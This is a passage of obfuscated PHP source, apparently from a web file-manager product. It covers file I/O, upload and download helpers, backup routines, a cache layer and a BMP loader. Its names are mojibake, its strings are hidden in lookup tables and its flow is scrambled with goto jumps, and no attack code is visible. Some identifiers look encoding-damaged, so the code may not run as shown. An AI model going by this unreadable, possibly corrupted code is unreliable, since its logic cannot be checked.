rtrim($FÂ˜ÚÄç‡, $aÎƒ©¹àª“[8]) . $aÎƒ©¹àª“[8]; goto fĞàïÍÍ·Ş; BìŠèé•ò”: } public function has($CÜîÍÒëß, $EÙ¹¯´Š• = false, $fõ¾Å¨Õ¬‚ = true) { goto cÎôç¾¤¸; c’ˆõ…—®Š: $A‘ç»±œ÷— = 0; while (($c¨™Ê“«È— = readdir($fÅßî–ğ´Ó)) !== !1) { if ($c¨™Ê“«È— == $C¦ä“ÜêÃÙ[91] || $c¨™Ê“«È— == $C¦ä“ÜêÃÙ[1173]) { continue; } $EÛŒõÒÓ = $CÜîÍÒëß . $c¨™Ê“«È—; if ($EÙ¹¯´Š•) { $A‘ç»±œ÷—++; if (@is_file($EÛŒõÒÓ)) { $BÌ×ò¤¢é++; } else { $eä”ªÊÑã++; } if ($A‘ç»±œ÷— > 10000) { break; } continue; } if ($fõ¾Å¨Õ¬‚) { if (@is_file($EÛŒõÒÓ)) { return !0; } } else { if (@is_dir($EÛŒõÒÓ . $C¦ä“ÜêÃÙ[8])) { return !0; } } } closedir($fÅßî–ğ´Ó); goto fÃª¼•¢Ü¼; cÎôç¾¤¸: $C¦ä“ÜêÃÙ =& $_SERVER[¯Ò¬Èè]; $CÜîÍÒëß = $this->iconvSystem($CÜîÍÒëß); $CÜîÍÒëß = rtrim($CÜîÍÒëß, $C¦ä“ÜêÃÙ[8]) . $C¦ä“ÜêÃÙ[8]; goto F±Ãßå×ÏŒ; fÃª¼•¢Ü¼: if ($EÙ¹¯´Š•) { return array($C¦ä“ÜêÃÙ[191] => $BÌ×ò¤¢é, $C¦ä“ÜêÃÙ[192] => $eä”ªÊÑã); } return !1; goto AÆ½µó¡Ò³; F±Ãßå×ÏŒ: if (!($fÅßî–ğ´Ó = @opendir($CÜîÍÒëß))) { return !1; } $BÌ×ò¤¢é = 0; $eä”ªÊÑã = 0; goto c’ˆõ…—®Š; AÆ½µó¡Ò³: } public function hashSimple($Dé«ò´˜¯Ä) { goto F®ŠêÆÑ÷®; aÜò£ ŒŸ: if ($b”¶ÇØÆÚ <= $b©†Ó¦ÑÛã * $DáÁÌ—Äµ) { return $this->hashMd5($Dé«ò´˜¯Ä) . $b”¶ÇØÆÚ; } $dÜŸøàÎ¶Í = $BöàÊ‰àÃÂ[33]; $BåˆŠ·§‚ğ = intval($b”¶ÇØÆÚ / $DáÁÌ—Äµ); goto C’”Ó®Á„„; C’”Ó®Á„„: $eµŠãé¼ø÷ = fopen($Dé«ò´˜¯Ä, $BöàÊ‰àÃÂ[1178]); if (!$eµŠãé¼ø÷) { return $dÜŸøàÎ¶Í; } for ($cŒìÚ¢®ã† = 0; $cŒìÚ¢®ã† < $DáÁÌ—Äµ; $cŒìÚ¢®ã†++) { fseek($eµŠãé¼ø÷, $BåˆŠ·§‚ğ * $cŒìÚ¢®ã†); $dÜŸøàÎ¶Í .= fread($eµŠãé¼ø÷, $b©†Ó¦ÑÛã); } goto Bä™—¹¤ç©; a…Î‘ôÔ×¶: return md5($dÜŸøàÎ¶Í) . $b”¶ÇØÆÚ; goto d‹—»‡ÚÊË; Bä™—¹¤ç©: fseek($eµŠãé¼ø÷, $b”¶ÇØÆÚ - $b©†Ó¦ÑÛã); $dÜŸøàÎ¶Í .= fread($eµŠãé¼ø÷, $b©†Ó¦ÑÛã); fclose($eµŠãé¼ø÷); goto a…Î‘ôÔ×¶; F®ŠêÆÑ÷®: $BöàÊ‰àÃÂ =& $_SERVER[¯Ò¬Èè]; if (!$Dé«ò´˜¯Ä) { return md5($BöàÊ‰àÃÂ[33]); } $Dé«ò´˜¯Ä = $this->iconvSystem($Dé«ò´˜¯Ä); goto b¼ºÕê„; b¼ºÕê„: $b”¶ÇØÆÚ = $this->size($Dé«ò´˜¯Ä); $b©†Ó¦ÑÛã = 200; $DáÁÌ—Äµ = 50; goto aÜò£ ŒŸ; d‹—»‡ÚÊË: } public function getContent($DŠ­Á¥„ĞÍ) { $DŠ­Á¥„ĞÍ = $this->iconvSystem($DŠ­Á¥„ĞÍ); return file_get_contents($DŠ­Á¥„ĞÍ); } public function setContent($F‡Í¿­Òéò, $f•ÄªÜïâ¶ = '') { $F‡Í¿­Òéò = $this->iconvSystem($F‡Í¿­Òéò); @file_put_contents($F‡Í¿­Òéò, $f•ÄªÜïâ¶, LOCK_EX); clearstatcache(); return strlen($f•ÄªÜïâ¶) == filesize($F‡Í¿­Òéò); } public function fileSubstr($b‰ò­ˆÆÄ, $CÏšºà„œ = 0, $E¶îÒÖ¶°İ = false) { goto CíåìÃ‘ù; f›¤”ˆßÀÕ: fseek($BÇõå²Àì¬, $CÏšºà„œ); $d‰„ö„•»¯ = fread($BÇõå²Àì¬, $E¶îÒÖ¶°İ); fclose($BÇõå²Àì¬); goto F–†¿´ğ®¬; F–†¿´ğ®¬: return $d‰„ö„•»¯; goto bŞù··©ôÑ; aˆÉßŒ¸º: if ($E¶îÒÖ¶°İ <= 0) { return $D¶™¥ßã[33]; } $BÇõå²Àì¬ = fopen($b‰ò­ˆÆÄ, $D¶™¥ßã[1178]); if (!$BÇõå²Àì¬) { return !1; } goto f›¤”ˆßÀÕ; CíåìÃ‘ù: $D¶™¥ßã =& $_SERVER[¯Ò¬Èè]; $b‰ò­ˆÆÄ = $this->iconvSystem($b‰ò­ˆÆÄ); if ($E¶îÒÖ¶°İ === !1) { $E¶îÒÖ¶°İ = $this->size($b‰ò­ˆÆÄ); } goto aˆÉßŒ¸º; bŞù··©ôÑ: } public function upload($d˜³íÖ²áÊ, $a´³¡“šÁç, $a³‹‰«Šñ» = false, $A²¾‡§î½´ = REPEAT_REPLACE) { $d÷‚Øİô¨ = $this->copyFile($a´³¡“šÁç, $d˜³íÖ²áÊ); return $d÷‚Øİô¨ ? $this->getPathOuter($d˜³íÖ²áÊ) : !1; } public function download($aÒ”½…‡¿, $bôÒ—®ö˜‚) { return $this->iconvSystem($aÒ”½…‡¿); } } goto b…¯ÆØ­¶; Cå›¯å¶“¶: define($_SERVER[¯Ò¬Èè][554], $_SERVER[¯Ò¬Èè][555]); $dƒªáå‰Ş• = $_SERVER[¯Ò¬Èè][556]; if (!$dƒªáå‰Ş•) { die; } goto F‚®¬ìùøÜ; BŒ¶¥Ñàµø: function Action($f¡±×÷œù = '') { goto cÃôÑš°; B”˜Ùé¬²: $CãİÄÕñ¥[$AØÍ•ê¼Š°] = new $AÙ¶á£ºÆØ(); $CãİÄÕñ¥[$AëŒøÈ‘] = $CãİÄÕñ¥[$AØÍ•ê¼Š°]; return $CãİÄÕñ¥[$AØÍ•ê¼Š°]; goto cäï¼µõÎ; bšø‰÷Œëñ: if (isset($CãİÄÕñ¥[$AëŒøÈ‘])) { return $CãİÄÕñ¥[$AëŒøÈ‘]; } $f¡±×÷œù = trim(str_replace($aæíßœå¦î[4], $aæíßœå¦î[5], $f¡±×÷œù), $aæíßœå¦î[4]); $f‰ÛÓÎñ¦ = explode($aæíßœå¦î[5], $f¡±×÷œù); goto BÃÉ¿Ğ×Ç; BÃÉ¿Ğ×Ç: $añÇóùÜè = strtolower($f‰ÛÓÎñ¦[0]); if (substr($añÇóùÜè, -6) == $aæíßœå¦î[6]) { $f¡±×÷œù = substr($f‰ÛÓÎñ¦[0], 0, -6); $AÙ¶á£ºÆØ = $f¡±×÷œù . $aæíßœå¦î[7]; $B“®ğÌÁêÆ = $aæíßœå¦î[8]; if (isset($f‰ÛÓÎñ¦[1]) && substr(strtolower($f‰ÛÓÎñ¦[1]), -5) == $aæíßœå¦î[9]) { $AÙ¶á£ºÆØ = $f¡±×÷œù . $f‰ÛÓÎñ¦[1]; $B“®ğÌÁêÆ = $aæíßœå¦î[10] . $f‰ÛÓÎñ¦[1] . $aæíßœå¦î[11]; } else { if (count($f‰ÛÓÎñ¦) == 3) { $AÙ¶á£ºÆØ = $f¡±×÷œù . $f‰ÛÓÎñ¦[1] . $f‰ÛÓÎñ¦[2]; $B“®ğÌÁêÆ = $aæíßœå¦î[12] . $f‰ÛÓÎñ¦[1] . $aæíßœå¦î[13] . $f‰ÛÓÎñ¦[2] . $aæíßœå¦î[11]; } } $B“®ğÌÁêÆ = PLUGIN_DIR . $f¡±×÷œù . $aæíßœå¦î[4] . $B“®ğÌÁêÆ; } else { if (substr($añÇóùÜè, -5) == $aæíßœå¦î[9]) { $f¡±×÷œù = substr($f‰ÛÓÎñ¦[0], 0, -5); return Model($f¡±×÷œù); } else { $AÙ¶á£ºÆØ = $f‰ÛÓÎñ¦[0] . $f‰ÛÓÎñ¦[1]; $B“®ğÌÁêÆ = CONTROLLER_DIR . $f‰ÛÓÎñ¦[0] . $aæíßœå¦î[4] . $f‰ÛÓÎñ¦[1] . $aæíßœå¦î[14]; } } $AØÍ•ê¼Š° = strtolower($AÙ¶á£ºÆØ); goto cŒÙà¯”­; cŒÙà¯”­: if (isset($CãİÄÕñ¥[$AØÍ•ê¼Š°])) { return $CãİÄÕñ¥[$AØÍ•ê¼Š°]; } if (is_file($B“®ğÌÁêÆ)) { include_once $B“®ğÌÁêÆ; } if (!class_exists($AÙ¶á£ºÆØ)) { return actionCallError("\133{$f¡±×÷œù}\40\x3d\76\x20{$AÙ¶á£ºÆØ}\x5d\x20\143\x6c\x61\x73\x73\x20\156\157\x74\40\145\170\x69\x73\x74\x73\x21"); } goto B”˜Ùé¬²; cÃôÑš°: $aæíßœå¦î =& $_SERVER[™‡«†³Ğ]; static $CãİÄÕñ¥ = array(); $AëŒøÈ‘ = $f¡±×÷œù; goto bšø‰÷Œëñ; cäï¼µõÎ: } function ActionApply($A‰”Õ´¶˜, $eŒğî½«ß’ = array()) { goto Eã÷ò“¼; BõÛïÑ…É: if (!method_exists($cÈ¨ÚÂ–¸, $a–µ”ö¥À)) { return actionCallError("{$A‰”Õ´¶˜}\x20\x6d\145\x74\x68\x6f\144\40\156\157\164\40\x65\170\x69\163\164\x73\41"); } $cªÜĞ¨´ˆ– = call_user_func_array(array($cÈ¨ÚÂ–¸, $a–µ”ö¥À), $eŒğî½«ß’); return $cªÜĞ¨´ˆ–; goto cªœ°‰²ö; FÇó«Ç¢: $d¼‰¹†ÄÙ = substr($A‰”Õ´¶˜, 0, $f¶‰°ŠñÛ); $a–µ”ö¥À = substr($A‰”Õ´¶˜, $f¶‰°ŠñÛ + 1); $cÈ¨ÚÂ–¸ = Action($d¼‰¹†ÄÙ); goto BõÛïÑ…É; Eã÷ò“¼: if (is_array($A‰”Õ´¶˜)) { return call_user_func_array($A‰”Õ´¶˜, $eŒğî½«ß’); } if (function_exists($A‰”Õ´¶˜)) { return call_user_func_array($A‰”Õ´¶˜, $eŒğî½«ß’); } $f¶‰°ŠñÛ = strrpos($A‰”Õ´¶˜, $_SERVER[™‡«†³Ğ][5]); goto FÇó«Ç¢; cªœ°‰²ö: } function actionCallError($B×Ü¼ÎÆêè) { $EÆÜ¬›¼ã· =& $_SERVER[™‡«†³Ğ]; $Dƒ¥º¥Äç = json_encode_force(array($EÆÜ¬›¼ã·[15] => this_url(), $EÆÜ¬›¼ã·[16] => $GLOBALS[$EÆÜ¬›¼ã·[16]])); $Dƒ¥º¥Äç = str_replace(array($EÆÜ¬›¼ã·[17]), array($EÆÜ¬›¼ã·[4]), $Dƒ¥º¥Äç); return write_log($B×Ü¼ÎÆêè . $EÆÜ¬›¼ã·[18] . $Dƒ¥º¥Äç, $EÆÜ¬›¼ã·[19]); } goto bø‚¤ãØ¥‰; fÃ×ìœŞ™·: class BackupDbFile { public function __construct() { } public function index() { goto cÄØÓ‡ÖÒ‰; aã…¨Åàï: $aŠ»‘‚ˆÆ• = CONTROLLER_DIR . $B“ÚÒŒî¶Â[747]; IO::copy($Eµå¢æš«È, $eëÆËâˆè´ . "\x62\141\143\x6b\165\160\x5f{$e¼Şñ±„‰‰}\57"); IO::copy($aŠ»‘‚ˆÆ•, $eëÆËâˆè´ . "\142\141\143\x6b\x75\160\x5f{$e¼Şñ±„‰‰}\57"); goto Dä«‰ÖºÃ; CˆìÃ…¡‹: $fŠñ‚²ùá = TEMP_FILES . "\142\x61\143\153\165\x70\x5f{$e¼Şñ±„‰‰}\x2f"; $eëÆËâˆè´ = "\173\x69\x6f\x3a{$C‹«½æ¥Œ¿[$B“ÚÒŒî¶Â[705]]}\175\x2f\144\x61\164\x61\x62\141\163\145\57"; IO::mkdir($eëÆËâˆè´ . "\142\x61\x63\153\x75\160\x5f{$e¼Şñ±„‰‰}\57"); goto EÊí¬ç×ô; Dä«‰ÖºÃ: $fçØÄŠæá->end(); Backup::set(array($B“ÚÒŒî¶Â[748] => $b¶šïË‘Â£[$B“ÚÒŒî¶Â[77]])); return !0; goto A£Ü¯Äëè; FÙ×¤æ¼‘: Backup::set(array($B“ÚÒŒî¶Â[745] => $b¶šïË‘Â£[$B“ÚÒŒî¶Â[77]])); IO::move($fŠñ‚²ùá, $eëÆËâˆè´); $Eµå¢æš«È = CONTROLLER_DIR . $B“ÚÒŒî¶Â[746]; goto aã…¨Åàï; EÊí¬ç×ô: $fçØÄŠæá = new TaskFileTransfer($B“ÚÒŒî¶Â[743], $B“ÚÒŒî¶Â[728], 0, LNG($B“ÚÒŒî¶Â[729]) . $B“ÚÒŒî¶Â[412] . LNG($B“ÚÒŒî¶Â[731]) . $B“ÚÒŒî¶Â[744]); $fçØÄŠæá->addPath($fŠñ‚²ùá); $b¶šïË‘Â£ = IO::infoWithChildren($fŠñ‚²ùá); goto FÙ×¤æ¼‘; cÄØÓ‡ÖÒ‰: $B“ÚÒŒî¶Â =& $_SERVER[¯Ò¬Èè]; $C‹«½æ¥Œ¿ = Backup::get(); $e¼Şñ±„‰‰ = $C‹«½æ¥Œ¿[$B“ÚÒŒî¶Â[28]]; goto CˆìÃ…¡‹; A£Ü¯Äëè: } } class BackupFile { public function __construct() { } public function index() { goto c‡èŸ¿Ìºƒ; eÈÍßë—İ·: $d“ÓÊ¶Ï×Õ = $B£É‘­ùÒİ ? 1 : 0; $dŞù‚Šœ°¬ = array($_SERVER[¯Ò¬Èè][765] => 1, $_SERVER[¯Ò¬Èè][717] => time(), $_SERVER[¯Ò¬Èè][723] => $d“ÓÊ¶Ï×Õ, $_SERVER[¯Ò¬Èè][762] => $EğÓàœ˜§Æ, $_SERVER[¯Ò¬Èè][754] => $Cš‡ÍÊÆÜ, $_SERVER[¯Ò¬Èè][753] => $a³ÓÇ³ãÖ); if ($aÛêä£Æ’¿) { $dŞù‚Šœ°¬[$_SERVER[¯Ò¬Èè][763]] = $Eù·ğñÄê…; $dŞù‚Šœ°¬[$_SERVER[¯Ò¬Èè][764]] = $b¡‘†”¯Íã; } goto CÆËÍ¦åî‘; BˆËÜËß¾¹: $B£É‘­ùÒİ = !0; $AìÌ×„’öë = $this->storeIds(); $Aê¾¶ÈÓ† = 1; goto d¥’´×Ì°; d¥’´×Ì°: $c¼—‡¾ãêï = 1000; $bÅ¢ÜÁ¯…· = $aÛêä£Æ’¿ = 0; $EƒÉºé¢‚ª = array(); goto BÛ¹Í¬¾é; B‡½µŞæ¶‡: $a³ÓÇ³ãÖ = (int) Model($_SERVER[¯Ò¬Èè][733])->where($aâòëœŞ—­)->count($_SERVER[¯Ò¬Èè][419]); $Cš‡ÍÊÆÜ = (int) Model($_SERVER[¯Ò¬Èè][733])->where($aâòëœŞ—­)->sum($_SERVER[¯Ò¬Èè][77]); $CÁ™«ğÈŠ÷ = new TaskFileTransfer($_SERVER[¯Ò¬Èè][751], $_SERVER[¯Ò¬Èè][728], $a³ÓÇ³ãÖ, LNG($_SERVER[¯Ò¬Èè][729]) . $_SERVER[¯Ò¬Èè][730] . LNG($_SERVER[¯Ò¬Èè][752])); goto DÜ…Î’–Û’; c‡èŸ¿Ìºƒ: $bé‡§‹¹¢ù = Backup::get(); $EğÓàœ˜§Æ = $bé‡§‹¹¢ù[$_SERVER[¯Ò¬Èè][281]][$_SERVER[¯Ò¬Èè][167]][$_SERVER[¯Ò¬Èè][419]]; $aâòëœŞ—­ = array($_SERVER[¯Ò¬Èè][420] => array($_SERVER[¯Ò¬Èè][749], $EğÓàœ˜§Æ), $_SERVER[¯Ò¬Èè][750] => array($_SERVER[¯Ò¬Èè][319], $bé‡§‹¹¢ù[$_SERVER[¯Ò¬Èè][705]])); goto B‡½µŞæ¶‡; CÆËÍ¦åî‘: Backup::set($dŞù‚Šœ°¬); $this->_fileFilter($EƒÉºé¢‚ª); return !0; goto f•¸‡•Âø; DÜ…Î’–Û’: $CÁ™«ğÈŠ÷->task[$_SERVER[¯Ò¬Èè][712]] = $Cš‡ÍÊÆÜ; $dŞù‚Šœ°¬ = array($_SERVER[¯Ò¬Èè][753] => $a³ÓÇ³ãÖ, $_SERVER[¯Ò¬Èè][754] => $Cš‡ÍÊÆÜ); Backup::set($dŞù‚Šœ°¬); goto BˆËÜËß¾¹; BÛ¹Í¬¾é: $b¡‘†”¯Íã = $Eù·ğñÄê… = 0; do { $d¤Şñ¦Œ¿‘ = $_SERVER[¯Ò¬Èè][755]; $eÈè°“ÂåÒ = Model($_SERVER[¯Ò¬Èè][733])->where($aâòëœŞ—­)->field($d¤Şñ¦Œ¿‘)->order($_SERVER[¯Ò¬Èè][756])->selectPage($c¼—‡¾ãêï, $Aê¾¶ÈÓ†); $A¦ƒ²Ö”•¼ = !empty($eÈè°“ÂåÒ[$_SERVER[¯Ò¬Èè][354]]) ? $eÈè°“ÂåÒ[$_SERVER[¯Ò¬Èè][354]] : array(); foreach ($A¦ƒ²Ö”•¼ as $f­¢Ö±î¤–) { goto aÎ‘Ÿ„ïˆ“; cÜ®‘Œ™¶: if (IO::exist($FŸˆƒ‹”ƒÁ)) { $CÁ™«ğÈŠ÷->updateFileEnd($f­¢Ö±î¤–[$_SERVER[¯Ò¬Èè][28]], $f­¢Ö±î¤–[$_SERVER[¯Ò¬Èè][77]]); } else { $FŸˆƒ‹”ƒÁ = get_path_father($FŸˆƒ‹”ƒÁ); IO::mkdir($FŸˆƒ‹”ƒÁ); if (!IO::copy($F‘Ü…ÍÓ­‚, $FŸˆƒ‹”ƒÁ, $_SERVER[¯Ò¬Èè][759])) { write_log($_SERVER[¯Ò¬Èè][760] . $F‘Ü…ÍÓ­‚ . $_SERVER[¯Ò¬Èè][761] . $FŸˆƒ‹”ƒÁ . $_SERVER[¯Ò¬Èè][476], $_SERVER[¯Ò¬Èè][728]); $B£É‘­ùÒİ = !1; break; } } $EğÓàœ˜§Æ = $f­¢Ö±î¤–[$_SERVER[¯Ò¬Èè][419]]; $aÛêä£Æ’¿ += 1; goto aÑæÀ¾¥­; aÎ‘Ÿ„ïˆ“: if (!$this->_fileExist($f­¢Ö±î¤–, $EƒÉºé¢‚ª, $AìÌ×„’öë)) { $a³ÓÇ³ãÖ -= 1; $Cš‡ÍÊÆÜ -= (int) $f­¢Ö±î¤–[$_SERVER[¯Ò¬Èè][77]]; write_log("\x66\151\x6c\x65\x20\156\157\x74\x20\x65\170\x69\x73\164\56\x66\x69\154\145\111\x44\x3a{$f­¢Ö±î¤–[$_SERVER[¯Ò¬Èè][419]]}\54\x20\160\x61\164\x68\72{$f­¢Ö±î¤–[$_SERVER[¯Ò¬Èè][75]]}", $_SERVER[¯Ò¬Èè][757]); continue; } $F‘Ü…ÍÓ­‚ = $f­¢Ö±î¤–[$_SERVER[¯Ò¬Èè][75]]; $FŸˆƒ‹”ƒÁ = "\173\151\x6f\72{$bé‡§‹¹¢ù[$_SERVER[¯Ò¬Èè][705]]}\x7d" . substr($F‘Ü…ÍÓ­‚, strlen("\173\x69\x6f\x3a{$f­¢Ö±î¤–[$_SERVER[¯Ò¬Èè][758]]}\x7d")); goto cÜ®‘Œ™¶; aÑæÀ¾¥­: $bÅ¢ÜÁ¯…· += $f­¢Ö±î¤–[$_SERVER[¯Ò¬Èè][77]]; $Eù·ğñÄê… += 1; $b¡‘†”¯Íã += $f­¢Ö±î¤–[$_SERVER[¯Ò¬Èè][77]]; goto d•Æ¦ïÄ×ä; d•Æ¦ïÄ×ä: if ($bÅ¢ÜÁ¯…· >= 1024 * 1024 * 100) { $dŞù‚Šœ°¬ = array($_SERVER[¯Ò¬Èè][762] => $EğÓàœ˜§Æ, $_SERVER[¯Ò¬Èè][763] => $Eù·ğñÄê…, $_SERVER[¯Ò¬Èè][764] => $b¡‘†”¯Íã); Backup::set($dŞù‚Šœ°¬); $bÅ¢ÜÁ¯…· = $aÛêä£Æ’¿ = 0; } goto a£ÙÇ¬­‘•; a£ÙÇ¬­‘•: } $b¸¥«µ÷Ú = count($A¦ƒ²Ö”•¼); $Aê¾¶ÈÓ†++; } while ($b¸¥«µ÷Ú == $c¼—‡¾ãêï); $CÁ™«ğÈŠ÷->end(); goto eÈÍßë—İ·; f•¸‡•Âø: } private function _fileExist($bÜ™İ°‹ÛÇ, &$b—àˆŞØ¥, $AøÁ¸†ÓÖö) { goto DçÖ¾ÑÌËö; fÍÆïÍßµ: if (!in_array($bÜ™İ°‹ÛÇ[$CŒ‚µù÷ø™[758]], $AøÁ¸†ÓÖö)) { return !1; } if (IO::exist($aô®áåÆËÚ)) { return !0; } $c®Îé’è = get_path_father($aô®áåÆËÚ); goto e½‡¡µ¹ê†; A¹Íæ˜¡Õì: $b—àˆŞØ¥ = array_merge($b—àˆŞØ¥, array_to_keyvalue($a«¡‡ßŒãê, $CŒ‚µù÷ø™[33], $CŒ‚µù÷ø™[419])); return !1; goto Aø„ÚÍ¨¹; e½‡¡µ¹ê†: if (IO::exist($c®Îé’è)) { $b—àˆŞØ¥[] = $bÜ™İ°‹ÛÇ[$CŒ‚µù÷ø™[419]]; return !1; } $fô¹•¢æ¢¢ = array($CŒ‚µù÷ø™[758] => $bÜ™İ°‹ÛÇ[$CŒ‚µù÷ø™[758]], $CŒ‚µù÷ø™[75] => array($CŒ‚µù÷ø™[766], "{$c®Îé’è}\x25")); $a«¡‡ßŒãê = Model($CŒ‚µù÷ø™[733])->where($fô¹•¢æ¢¢)->field($CŒ‚µù÷ø™[420])->select(); goto A¹Íæ˜¡Õì; DçÖ¾ÑÌËö: $CŒ‚µù÷ø™ =& $_SERVER[¯Ò¬Èè]; $aô®áåÆËÚ = $bÜ™İ°‹ÛÇ[$CŒ‚µù÷ø™[75]]; if (in_array($bÜ™İ°‹ÛÇ[$CŒ‚µù÷ø™[419]], $b—àˆŞØ¥)) { return !1; } goto fÍÆïÍßµ; Aø„ÚÍ¨¹: } private function _fileFilter($F›»í¡³×½) { $cÀ¯²«ğ =& $_SERVER[¯Ò¬Èè]; if (empty($F›»í¡³×½)) { return; } $f­£¦ŒÃß‚ = array($cÀ¯²«ğ[419] => array($cÀ¯²«ğ[7], array_unique($F›»í¡³×½))); $b»éÕ•â = Model($cÀ¯²«ğ[767])->where($f­£¦ŒÃß‚)->field($cÀ¯²«ğ[369])->select(); foreach ($b»éÕ•â as $aÅ“Ú›Ôå) { Model($cÀ¯²«ğ[767])->remove($aÅ“Ú›Ôå[$cÀ¯²«ğ[369]], !1); } } private function storeIds() { $eß±ˆÏğ‘¡ =& $_SERVER[¯Ò¬Èè]; $Bˆ®œÂˆ“ = Model($eß±ˆÏğ‘¡[718])->listData(); $aÓ˜Š¦±µ§ = array(); $Cè×¬”•¦† = $GLOBALS[$eß±ˆÏğ‘¡[6]][$eß±ˆÏğ‘¡[84]][$eß±ˆÏğ‘¡[768]]; foreach ($Bˆ®œÂˆ“ as $bîğç¶í®¢) { $a´……–‡¹Î = strtolower($bîğç¶í®¢[$eß±ˆÏğ‘¡[90]]); if (!isset($Cè×¬”•¦†[$a´……–‡¹Î])) { continue; } $A¹Äò†ğ = $eß±ˆÏğ‘¡[71] . (isset($Cè×¬”•¦†[$a´……–‡¹Î]) ? $Cè×¬”•¦†[$a´……–‡¹Î] : ucfirst($a´……–‡¹Î)); if (!class_exists($A¹Äò†ğ)) { continue; } $aÓ˜Š¦±µ§[] = $bîğç¶í®¢[$eß±ˆÏğ‘¡[367]]; } return $aÓ˜Š¦±µ§; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto d±²¯Ê—‰ø; BŸ„£áŠè‹: $CÂ£Ğ»ˆâ¬ = $GLOBALS[$eâ´ƒ­šó¤[6]][$eâ´ƒ­šó¤[337]]; $B±¦äèœìí = $CÂ£Ğ»ˆâ¬[$CÂ£Ğ»ˆâ¬[$eâ´ƒ­šó¤[769]]]; $BòÂ­¶š­ = $CÂ£Ğ»ˆâ¬[$eâ´ƒ­šó¤[770]]; goto C½±ˆÓ¶‚â; d±²¯Ê—‰ø: $eâ´ƒ­šó¤ =& $_SERVER[¯Ò¬Èè]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto BŸ„£áŠè‹; C½±ˆÓ¶‚â: switch ($CÂ£Ğ»ˆâ¬[$eâ´ƒ­šó¤[769]]) { case $eâ´ƒ­šó¤[17]: self::$handle = Model($eâ´ƒ­šó¤[771]); break; case $eâ´ƒ­šó¤[772]: self::$handle = new CacheRedis($B±¦äèœìí, $BòÂ­¶š­); break; case $eâ´ƒ­šó¤[773]: self::$handle = new CacheMemcached($B±¦äèœìí, $BòÂ­¶š­); break; case $eâ´ƒ­šó¤[167]: self::$handle = new CacheFile($B±¦äèœìí, $BòÂ­¶š­); break; default: break; } return self::$handle; goto e–££…Ì±×; e–££…Ì±×: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($FŒ—†«ƒ) { if (is_array($FŒ—†«ƒ) || is_object($FŒ—†«ƒ)) { $FŒ—†«ƒ = json_encode($FŒ—†«ƒ); } $FŒ—†«ƒ = rawurlencode($FŒ—†«ƒ); return KOD_SITE_ID . $_SERVER[¯Ò¬Èè][70] . $FŒ—†«ƒ; } public static function get($DÁ°É‰˜º) { $E×Ğ§éÅ» = self::key($DÁ°É‰˜º); if (!isset(self::$memoryCache[$E×Ğ§éÅ»])) { $bİ¸¡»§¹Ï = self::init()->get($E×Ğ§éÅ»); self::$memoryCache[$E×Ğ§éÅ»] = unserialize($bİ¸¡»§¹Ï); } return self::$memoryCache[$E×Ğ§éÅ»]; } public static function set($bŒê´ªåè, $cœæŠ¢ç„½, $bÍ‹ãÛƒ»ö = false) { goto C«³‘ƒæÙé; fàÄ­…Æ: CacheLock::lock($bŒê´ªåè); $d¹‚·ãÁßç = self::init()->set($f‘óîÃ, serialize($cœæŠ¢ç„½), $bÍ‹ãÛƒ»ö); self::$memoryCache[$f‘óîÃ] = $cœæŠ¢ç„½; goto f¹’»Ü»–™; f¹’»Ü»–™: CacheLock::unlock($bŒê´ªåè); return $d¹‚·ãÁßç; goto fß¡°†âÑ; C«³‘ƒæÙé: $f‘óîÃ = self::key($bŒê´ªåè); if (isset(self::$memoryCache[$f‘óîÃ]) && self::$memoryCache[$f‘óîÃ] === $cœæŠ¢ç„½) { return !0; } if ($bÍ‹ãÛƒ»ö === 0) { self::$memoryCache[$f‘óîÃ] = $cœæŠ¢ç„½; return !0; } goto fàÄ­…Æ; fß¡°†âÑ: } public static function remove($A…İ¦‘‚»İ) { goto BïºÆ÷¬„®; BïºÆ÷¬„®: $bœçğ—ŸÄæ = self::key($A…İ¦‘‚»İ); unset(self::$memoryCache[$bœçğ—ŸÄæ]); self::clearTimeout(); goto B¨Úö¦­Ô; B¨Úö¦­Ô: CacheLock::lock($A…İ¦‘‚»İ); $BÓ”¨ÄèÒª = self::init()->remove($bœçğ—ŸÄæ); CacheLock::unlock($A…İ¦‘‚»İ); goto eº§½à•±İ; eº§½à•±İ: return $BÓ”¨ÄèÒª; goto Fœ—ÁÕ²„Ü; Fœ—ÁÕ²„Ü: } public static function clearMemory($AŸ„´¬äé = false) { if ($AŸ„´¬äé) { $AŸ„´¬äé = self::key($AŸ„´¬äé); unset(self::$memoryCache[$AŸ„´¬äé]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¯Ò¬Èè][774])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¯Ò¬Èè][775])) { self::init()->clearTimeout(); } } } goto CïºÏ„Ø¿; fÊ©†Š‘Ÿ°: class ImageGdBMP { public static function load($cµçİ±‹Ş) { $eê“İ¸“¦¶ = fopen($cµçİ±‹Ş, $_SERVER[¯Ò¬Èè][1530]); if ($eê“İ¸“¦¶ === !1) { return !1; } $fºåÖÍĞòÌ = self::loadFromStream($eê“İ¸“¦¶); fclose($eê“İ¸“¦¶); return $fºåÖÍĞòÌ; } public static function loadFromStream($AôÓÆÓĞ‰) { $FÎÖïİ¨« =& $_SERVER[¯Ò¬Èè]; $Eæ§¼È‘³ = fread($AôÓÆÓĞ‰, 14); if ($Eæ§¼È‘³ === !1) { return !1; } if ($Eæ§¼È‘³[0] != $FÎÖïİ¨«[1841] || $Eæ§¼È‘³[1] != $FÎÖïİ¨«[1842]) { return !1; } $Eæ´£–ğåÚ = unpack($FÎÖïİ¨«[1843] . $FÎÖïİ¨«[1844] . $FÎÖïİ¨«[1845] . $FÎÖïİ¨«[1846] . $FÎÖïİ¨«[1847], $Eæ§¼È‘³); return self::loadFromStreamAndFileHeader($AôÓÆÓĞ‰, $Eæ´£–ğåÚ); } public static function loadFromStreamAndFileHeader($E¶·…×Á”, array $AŒ´‰ôÍôß) { goto Aˆï”†Õ­à; BµŠ¢¼§èŠ: if ($cŒå“ÅŒ²¨ == 1 || $cŒå“ÅŒ²¨ == 4 || $cŒå“ÅŒ²¨ == 8) { goto a¶‘˜ƒã¨¿; a¶‘˜ƒã¨¿: $c‚–Ã±å¹’ = imagecreate($BÒ²Œ‘Æ À, $BãÎİŞ¼ÜÃ); $d©ÀÁ¿§¢ = $B„òñ¨¶àŒ == 12 ? 3 : 4; 